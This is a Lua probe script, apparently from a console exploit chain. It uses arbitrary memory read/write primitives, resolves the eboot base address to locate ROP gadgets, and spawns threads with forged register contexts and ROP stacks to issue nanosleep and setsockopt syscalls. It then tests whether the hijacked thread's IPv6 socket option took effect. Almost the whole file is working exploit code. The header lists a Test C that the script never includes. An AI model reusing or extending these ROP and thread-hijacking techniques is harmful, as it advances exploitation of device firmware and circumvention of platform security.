-- CRASH_CLASS: LOW
-- PROBE 91s: thr_create control test — child does ONLY nanosleep
--
-- Isolate: is the output corruption from thr_create itself,
-- or from the child's setsockopt failing and crashing?
--
-- Test A: child nanosleep only (RAX=240, RDI=ts, RSI=0)
-- Test B: child setsockopt then nanosleep (with RSI cleared before sleep)
-- Test C: child setsockopt then repeated nanosleep (crash padding)

print("=== PROBE 91s: THR_CREATE CONTROL ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local tk=mk(433)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
print("eboot="..string.format("0x%X%08X",ehi,elo))

local _DI=0x048;local _SI=0x050;local _DX=0x058;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

-- ============================================================
-- TEST A: child does ONLY nanosleep (RAX=240, RDI=ts, RSI=0)
-- No setsockopt, no complications
-- ============================================================
print("")
print("--- A: NANOSLEEP ONLY ---")
do
    local ok1,stk=pcall(function()
        return mm(uint64(0),uint64(0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok1 then print("MMAP FAIL") return end

    local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))

    -- Child: just nanosleep (no ROP needed — direct from context)
    -- RAX=240, RDI=ts, RSI=0 → nanosleep(ts, NULL)
    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(N(stk)+0x1000)) -- stack in middle of page
    wq(ctx+_AX,uint64(240))     -- nanosleep
    wq(ctx+_DI,uint64(N(ts)))   -- rqtp
    wq(ctx+_SI,uint64(0))       -- rmtp = NULL

    -- After nanosleep returns (shouldn't, 999s), padding:
    -- Fill stack with repeated nanosleep chains
    local sp=N(stk)+0x1000
    for i=1,20 do
        wq(sp,PRDI); sp=sp+8
        wq(sp,uint64(N(ts))); sp=sp+8
        wq(sp,PRSI); sp=sp+8
        wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRAX); sp=sp+8
        wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
    native.fcall_with_rax(stub,240,N(sl),0)

    local a=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        a=(kr==0)
        pcall(function() tk(tid,uint64(9)) end)
    end
    print("A: tid="..tostring(tid and N(tid) or "nil").." alive="..tostring(a))
    print("A: PASS (output clean)")
end

-- ============================================================
-- TEST B: child setsockopt then nanosleep (RSI fixed before sleep)
-- ============================================================
print("")
print("--- B: SETSOCKOPT + FIXED NANOSLEEP ---")
do
    local s6=N(native.fcall_with_rax(stub,97,28,2,0))
    print("B: s6="..s6)
    if s6<=0 then print("B: NO IPv6") return end

    -- Set hops=42
    local vb=memory.alloc(4); wd(vb,42)
    native.fcall_with_rax(stub,105,s6,41,4,N(vb),4)

    local ok1,stk=pcall(function()
        return mm(uint64(0),uint64(0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok1 then print("MMAP FAIL") return end

    local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
    local optval=memory.alloc(4); wd(optval,77)

    -- ROP after setsockopt: clear RSI, then nanosleep, with padding
    local sp=N(stk)+0x1000
    for i=1,10 do
        wq(sp,PRSI); sp=sp+8
        wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8
        wq(sp,uint64(N(ts))); sp=sp+8
        wq(sp,PRAX); sp=sp+8
        wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end

    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(N(stk)+0x1000))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(s6))
    wq(ctx+_SI,uint64(41))
    wq(ctx+_DX,uint64(4))
    -- R10=optval, R8=4 at standard offsets
    wq(ctx+0x090,uint64(N(optval)))
    wq(ctx+0x068,uint64(4))

    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
    native.fcall_with_rax(stub,240,N(sl),0)

    -- Check hops
    local gb=memory.alloc(8); z(gb,8)
    local gl=memory.alloc(4); wd(gl,4)
    native.fcall_with_rax(stub,118,s6,41,4,N(gb),N(gl))
    local hops=rd(gb)

    local a=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        a=(kr==0)
        pcall(function() tk(tid,uint64(9)) end)
    end
    print("B: hops="..tostring(hops).." alive="..tostring(a))
    if hops==77 then print("B: *** SETSOCKOPT WORKED ***") end

    native.fcall_with_rax(stub,6,s6)
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91s DONE ===")
